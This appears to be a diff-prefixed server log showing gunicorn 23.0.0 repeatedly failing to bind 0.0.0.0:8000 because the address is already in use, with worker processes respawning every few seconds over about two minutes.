+[2024-12-20 09:55:08 -0300] [5518] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:08 -0300] [5518] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:09 -0300] [5518] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:09 -0300] [5518] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:10 -0300] [5518] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:55:11 -0300] [5519] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:55:11 -0300] [5519] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:11 -0300] [5519] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:12 -0300] [5519] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:12 -0300] [5519] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:13 -0300] [5519] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:13 -0300] [5519] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:14 -0300] [5519] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:14 -0300] [5519] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:15 -0300] [5519] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:15 -0300] [5519] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:16 -0300] [5519] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:55:16 -0300] [5520] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:55:16 -0300] [5520] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:16 -0300] [5520] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:17 -0300] [5520] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:17 -0300] [5520] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:18 -0300] [5520] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:18 -0300] [5520] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:19 -0300] [5520] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:19 -0300] [5520] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:20 -0300] [5520] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:20 -0300] [5520] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:21 -0300] [5520] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:55:21 -0300] [5521] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:55:21 -0300] [5521] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:21 -0300] [5521] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:22 -0300] [5521] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:22 -0300] [5521] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:23 -0300] [5521] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:23 -0300] [5521] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:24 -0300] [5521] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:24 -0300] [5521] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:25 -0300] [5521] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:25 -0300] [5521] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:26 -0300] [5521] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:55:26 -0300] [5522] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:55:26 -0300] [5522] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:26 -0300] [5522] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:27 -0300] [5522] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:27 -0300] [5522] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:28 -0300] [5522] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:28 -0300] [5522] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:29 -0300] [5522] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:29 -0300] [5522] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:30 -0300] [5522] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:30 -0300] [5522] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:31 -0300] [5522] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:55:32 -0300] [5523] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:55:32 -0300] [5523] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:32 -0300] [5523] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:33 -0300] [5523] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:33 -0300] [5523] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:34 -0300] [5523] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:34 -0300] [5523] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:35 -0300] [5523] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:35 -0300] [5523] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:36 -0300] [5523] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:36 -0300] [5523] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:37 -0300] [5523] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:55:37 -0300] [5524] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:55:37 -0300] [5524] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:37 -0300] [5524] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:38 -0300] [5524] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:38 -0300] [5524] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:39 -0300] [5524] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:39 -0300] [5524] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:40 -0300] [5524] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:40 -0300] [5524] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:41 -0300] [5524] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:41 -0300] [5524] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:42 -0300] [5524] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:55:42 -0300] [5525] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:55:42 -0300] [5525] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:42 -0300] [5525] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:43 -0300] [5525] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:43 -0300] [5525] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:44 -0300] [5525] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:44 -0300] [5525] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:45 -0300] [5525] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:45 -0300] [5525] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:46 -0300] [5525] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:46 -0300] [5525] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:47 -0300] [5525] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:55:47 -0300] [5526] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:55:47 -0300] [5526] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:47 -0300] [5526] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:48 -0300] [5526] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:48 -0300] [5526] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:49 -0300] [5526] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:49 -0300] [5526] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:50 -0300] [5526] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:50 -0300] [5526] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:51 -0300] [5526] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:51 -0300] [5526] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:52 -0300] [5526] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:55:53 -0300] [5527] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:55:53 -0300] [5527] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:53 -0300] [5527] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:54 -0300] [5527] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:54 -0300] [5527] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:55 -0300] [5527] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:55 -0300] [5527] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:56 -0300] [5527] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:56 -0300] [5527] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:57 -0300] [5527] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:57 -0300] [5527] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:58 -0300] [5527] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:55:58 -0300] [5528] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:55:58 -0300] [5528] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:58 -0300] [5528] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:59 -0300] [5528] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:59 -0300] [5528] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:00 -0300] [5528] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:00 -0300] [5528] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:01 -0300] [5528] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:01 -0300] [5528] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:02 -0300] [5528] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:02 -0300] [5528] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:03 -0300] [5528] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:56:03 -0300] [5529] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:56:03 -0300] [5529] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:03 -0300] [5529] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:04 -0300] [5529] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:04 -0300] [5529] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:05 -0300] [5529] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:05 -0300] [5529] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:06 -0300] [5529] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:06 -0300] [5529] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:07 -0300] [5529] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:07 -0300] [5529] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:08 -0300] [5529] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:56:08 -0300] [5530] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:56:08 -0300] [5530] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:08 -0300] [5530] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:09 -0300] [5530] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:09 -0300] [5530] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:10 -0300] [5530] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:10 -0300] [5530] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:11 -0300] [5530] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:11 -0300] [5530] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:12 -0300] [5530] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:12 -0300] [5530] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:13 -0300] [5530] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:56:14 -0300] [5531] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:56:14 -0300] [5531] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:14 -0300] [5531] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:15 -0300] [5531] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:15 -0300] [5531] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:16 -0300] [5531] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:16 -0300] [5531] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:17 -0300] [5531] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:17 -0300] [5531] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:18 -0300] [5531] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:18 -0300] [5531] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:19 -0300] [5531] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:56:19 -0300] [5532] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:56:19 -0300] [5532] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:19 -0300] [5532] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:20 -0300] [5532] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:20 -0300] [5532] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:21 -0300] [5532] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:21 -0300] [5532] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:22 -0300] [5532] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:22 -0300] [5532] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:23 -0300] [5532] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:23 -0300] [5532] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:24 -0300] [5532] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:56:24 -0300] [5533] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:56:24 -0300] [5533] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:24 -0300] [5533] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:25 -0300] [5533] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:25 -0300] [5533] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:26 -0300] [5533] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:26 -0300] [5533] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:27 -0300] [5533] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:27 -0300] [5533] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:28 -0300] [5533] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:28 -0300] [5533] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:29 -0300] [5533] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:56:29 -0300] [5536] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:56:29 -0300] [5536] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:29 -0300] [5536] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:30 -0300] [5536] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:30 -0300] [5536] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:31 -0300] [5536] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:31 -0300] [5536] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:32 -0300] [5536] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:32 -0300] [5536] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:33 -0300] [5536] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:33 -0300] [5536] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:34 -0300] [5536] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:56:34 -0300] [5537] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:56:34 -0300] [5537] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:34 -0300] [5537] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:35 -0300] [5537] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:35 -0300] [5537] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:36 -0300] [5537] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:36 -0300] [5537] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:37 -0300] [5537] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:37 -0300] [5537] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:38 -0300] [5537] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:38 -0300] [5537] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:39 -0300] [5537] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:56:40 -0300] [5538] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:56:40 -0300] [5538] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:40 -0300] [5538] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:41 -0300] [5538] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:41 -0300] [5538] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:42 -0300] [5538] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:42 -0300] [5538] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:43 -0300] [5538] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:43 -0300] [5538] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:44 -0300] [5538] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:44 -0300] [5538] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:45 -0300] [5538] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:56:45 -0300] [5539] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:56:45 -0300] [5539] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:45 -0300] [5539] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:46 -0300] [5539] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:46 -0300] [5539] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:47 -0300] [5539] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:47 -0300] [5539] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:48 -0300] [5539] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:48 -0300] [5539] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:49 -0300] [5539] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:49 -0300] [5539] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:50 -0300] [5539] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:56:50 -0300] [5548] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:56:50 -0300] [5548] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:50 -0300] [5548] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:51 -0300] [5548] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:51 -0300] [5548] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:52 -0300] [5548] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:52 -0300] [5548] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:53 -0300] [5548] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:53 -0300] [5548] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:54 -0300] [5548] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:54 -0300] [5548] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:55 -0300] [5548] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:56:55 -0300] [5549] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:56:55 -0300] [5549] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:55 -0300] [5549] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:56 -0300] [5549] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:56 -0300] [5549] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:57 -0300] [5549] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:57 -0300] [5549] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:58 -0300] [5549] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:58 -0300] [5549] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:56:59 -0300] [5549] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:56:59 -0300] [5549] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:00 -0300] [5549] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:57:01 -0300] [5550] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:57:01 -0300] [5550] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:01 -0300] [5550] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:02 -0300] [5550] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:02 -0300] [5550] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:03 -0300] [5550] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:03 -0300] [5550] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:04 -0300] [5550] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:04 -0300] [5550] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:05 -0300] [5550] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:05 -0300] [5550] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:06 -0300] [5550] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:57:06 -0300] [5551] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:57:06 -0300] [5551] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:06 -0300] [5551] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:07 -0300] [5551] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:07 -0300] [5551] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:08 -0300] [5551] [ERROR] Connection in use: ('0.0.0.0', 8000)
